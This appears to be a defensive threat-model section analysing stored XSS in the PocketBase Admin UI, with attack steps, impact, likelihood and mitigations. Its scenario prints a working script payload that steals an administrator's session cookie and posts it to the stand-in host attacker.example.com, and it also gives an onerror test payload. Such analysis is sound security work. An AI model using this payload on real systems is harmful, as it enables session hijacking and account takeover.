### 4. Deep Analysis of Attack Tree Path: Stored Cross-Site Scripting (XSS) in Admin UI (PB-ADMIN-02-01)

#### 4.1. Detailed Attack Vector Breakdown

The attack vector for PB-ADMIN-02-01 relies on the attacker's ability to inject malicious JavaScript code into data fields within the PocketBase Admin UI.  This injection occurs when an administrator, or potentially a compromised administrator account, interacts with the Admin UI to manage data.  Specifically, vulnerable areas are likely to be:

*   **Collection Management:** When creating or editing collections, fields like collection names, schema field names, help texts, or default values might be vulnerable if not properly sanitized before being stored in the database and subsequently rendered in the Admin UI.
*   **Record Management:** When creating or editing records within collections, any text-based fields (text, textarea, JSON, etc.) are potential injection points. If user-provided data in these fields is stored and later displayed in the Admin UI without proper encoding, XSS can occur.
*   **Settings/Configuration Pages:**  Less likely but still possible, configuration settings within the Admin UI that involve text input and are later displayed back to administrators could be vulnerable.

**How the Injection Works:**

1.  **Attacker Access:** The attacker needs to access the PocketBase Admin UI. This could be achieved through legitimate admin credentials (if compromised) or by exploiting other vulnerabilities to gain admin access (though this path focuses on exploitation *within* the Admin UI once access is assumed).
2.  **Malicious Input:** The attacker navigates to a vulnerable section of the Admin UI (e.g., editing a collection schema or creating a new record).
3.  **Injection Point Exploitation:** The attacker enters malicious JavaScript code into a text-based input field. This code could be disguised within seemingly normal text or directly injected as `<script>` tags or event handlers (e.g., `<img src="x" onerror="alert('XSS')">`).
4.  **Data Storage:** The PocketBase application stores this malicious input in its database without proper sanitization or encoding.
5.  **Vulnerable Rendering:** When another administrator (or even the attacker themselves in a persistent XSS scenario) accesses the Admin UI and views the data containing the malicious code, the application retrieves the data from the database and renders it in the browser *without* proper output encoding.
6.  **XSS Execution:** The browser interprets the malicious JavaScript code embedded in the rendered data and executes it within the context of the administrator's session.

#### 4.2. Step-by-Step Attack Execution Scenario

Let's illustrate with a concrete example:

**Scenario:** Attacker injects XSS through a "Collection Description" field.

1.  **Attacker logs into the PocketBase Admin UI** with compromised admin credentials.
2.  **Attacker navigates to "Collections"** and selects an existing collection to edit, or creates a new collection.
3.  **Attacker locates the "Description" field** for the collection (or a similar text-based field).
4.  **Attacker injects the following malicious JavaScript code into the "Description" field:**

    ```html
    <script>
        // Malicious code to steal admin session cookie and send it to attacker's server
        var cookie = document.cookie;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://attacker.example.com/log_cookie", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("cookie=" + cookie);
        alert("Collection description updated. (Malicious code executed in background)");
    </script>
    This is a normal description, but also contains malicious code.
    ```

5.  **Attacker saves the changes to the collection.** The malicious script is now stored in the database as part of the collection's description.
6.  **Another administrator logs into the PocketBase Admin UI** and navigates to the "Collections" section or views the details of the modified collection.
7.  **The PocketBase Admin UI retrieves the collection data from the database and renders the "Description" field.**  Crucially, it does not properly encode the output.
8.  **The browser executes the embedded JavaScript code** within the context of the second administrator's session.
9.  **The malicious script steals the second administrator's session cookie** and sends it to `attacker.example.com`.
10. **The attacker now has the session cookie of the second administrator.** They can use this cookie to impersonate the administrator and perform administrative actions within PocketBase, even without knowing their password.

#### 4.3. Potential Impact (Detailed)

Successful exploitation of Stored XSS in the Admin UI can have severe consequences:

*   **Admin Session Hijacking:** As demonstrated in the scenario, attackers can steal admin session cookies, allowing them to impersonate administrators and bypass authentication.
*   **Account Takeover:**  Beyond session hijacking, attackers could potentially modify admin account details (e.g., email, password) to permanently take over accounts.
*   **Data Exfiltration:** Malicious scripts can be used to exfiltrate sensitive data stored within PocketBase, including user data, application configurations, and potentially database credentials if accessible from the Admin UI context.
*   **Privilege Escalation:** If the initial compromised admin account has limited privileges, XSS can be used to escalate privileges by targeting higher-privileged administrators.
*   **Malware Distribution:** Attackers could inject scripts that redirect administrators to malicious websites or trigger downloads of malware onto their machines.
*   **Defacement of Admin UI:** While less impactful than other consequences, attackers could deface the Admin UI to disrupt operations or spread misinformation.
*   **Backdoor Creation:** Attackers could inject code to create persistent backdoors within the PocketBase application, allowing for long-term, unauthorized access.
*   **Full System Compromise:** In the worst-case scenario, if the PocketBase application has access to sensitive systems or networks, a compromised admin account through XSS could be used as a stepping stone to compromise the entire system or network.

#### 4.4. Likelihood Assessment (Justification)

The likelihood of this attack path being exploited is considered **Medium**.  Justification:

*   **Common Vulnerability:** XSS is a well-known and prevalent web application vulnerability.  Admin UIs, especially those handling complex data inputs, are often targets for XSS attacks.
*   **Complexity of Input Handling:** Admin UIs often deal with diverse data types and formats, increasing the complexity of input validation and output encoding, and thus the potential for overlooking vulnerabilities.
*   **Developer Oversight:** Developers might sometimes prioritize functionality over security, especially in rapidly developed applications or when using frameworks where default security configurations might not be sufficient.  Input sanitization and output encoding are crucial but can be missed or implemented incorrectly.
*   **PocketBase's Nature:** PocketBase is designed for ease of use and rapid development. While this is a strength, it can also mean that security considerations might be secondary for some users, leading to deployments with default configurations and potentially less rigorous security practices.
*   **Mitigating Factors:**
    *   PocketBase is actively developed, and the development team is responsive to security issues.
    *   Security awareness within the developer community is generally increasing.
    *   Best practices for XSS prevention are well-documented and widely available.

Despite the mitigating factors, the inherent complexity of web applications and the potential for human error in development make Stored XSS a realistic threat, especially in Admin UIs.

#### 4.5. Mitigation Strategies

To effectively mitigate the Stored XSS vulnerability in the PocketBase Admin UI, the following strategies should be implemented:

**4.5.1. Input Sanitization and Validation (Preventative - Server-Side & Client-Side):**

*   **Server-Side Input Validation:**  **Crucially important.** Implement robust server-side input validation for all data received from the Admin UI before storing it in the database. This validation should:
    *   **Define Allowed Input:** Clearly define the expected data types, formats, and lengths for each input field.
    *   **Reject Invalid Input:**  Reject or sanitize any input that does not conform to the defined rules.
    *   **Use Whitelisting:** Prefer whitelisting allowed characters and patterns over blacklisting disallowed ones, as blacklists are often incomplete and can be bypassed.
*   **Client-Side Input Validation (Optional - for User Experience):** Implement client-side validation to provide immediate feedback to administrators and prevent obviously malicious input from being sent to the server. *However, client-side validation is not a security control and should not be relied upon for security.* Server-side validation is mandatory.

**4.5.2. Output Encoding (Preventative - Server-Side & Client-Side):**

*   **Context-Aware Output Encoding:**  **Essential.**  Apply context-aware output encoding whenever data from the database is rendered in the Admin UI. This means encoding data based on the context in which it is being displayed (HTML, JavaScript, URL, CSS).
    *   **HTML Encoding:** Use HTML encoding (e.g., `&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`) for data rendered within HTML tags. This is the most common and critical type of encoding for XSS prevention.
    *   **JavaScript Encoding:** Use JavaScript encoding (e.g., `\`, `'`, `"`) when data is embedded within JavaScript code.
    *   **URL Encoding:** Use URL encoding (e.g., `%20`, `%3C`, `%3E`) when data is used in URLs.
*   **Templating Engine with Auto-Escaping:** Utilize a templating engine that provides automatic output encoding by default. Ensure that auto-escaping is enabled and correctly configured for the relevant contexts. Verify that PocketBase's templating engine (if used for Admin UI rendering) has this feature and it is properly utilized.

**4.5.3. Content Security Policy (CSP) (Preventative & Detective):**

*   **Implement a Strict CSP:** Configure a Content Security Policy (CSP) for the Admin UI to restrict the sources from which the browser is allowed to load resources (scripts, stylesheets, images, etc.).
    *   **`default-src 'self'`:**  Start with a restrictive `default-src 'self'` policy to only allow resources from the application's own origin by default.
    *   **`script-src 'self' 'unsafe-inline' 'unsafe-eval'` (Carefully Review):**  Carefully review the need for `'unsafe-inline'` and `'unsafe-eval'`.  Ideally, eliminate the need for inline scripts and `eval()` by refactoring code. If absolutely necessary, use nonces or hashes for inline scripts and consider alternatives to `eval()`.  For a secure Admin UI, strive to minimize or eliminate `'unsafe-inline'` and `'unsafe-eval'`.
    *   **`style-src 'self' 'unsafe-inline'` (Carefully Review):** Similar to scripts, minimize or eliminate `'unsafe-inline'` styles.
    *   **`object-src 'none'`, `base-uri 'none'`, `form-action 'self'`, etc.:**  Set other CSP directives to further restrict potentially dangerous behaviors.
    *   **Report-URI/report-to:** Configure `report-uri` or `report-to` directives to receive reports of CSP violations. This helps in detecting and monitoring potential XSS attempts and misconfigurations.

**4.5.4. Regular Security Audits and Penetration Testing (Detective & Corrective):**

*   **Code Reviews:** Conduct regular code reviews, specifically focusing on input handling and output rendering logic in the Admin UI.
*   **Automated Security Scanning:** Integrate automated security scanning tools into the development pipeline to detect potential XSS vulnerabilities early in the development lifecycle.
*   **Penetration Testing:** Perform periodic penetration testing by security professionals to simulate real-world attacks and identify vulnerabilities that might have been missed by automated tools and code reviews.

**4.5.5. Security Awareness Training for Developers:**

*   **XSS Prevention Training:** Provide developers with comprehensive training on XSS vulnerabilities, common attack vectors, and effective prevention techniques.
*   **Secure Coding Practices:** Promote secure coding practices throughout the development lifecycle, emphasizing input validation, output encoding, and the principle of least privilege.
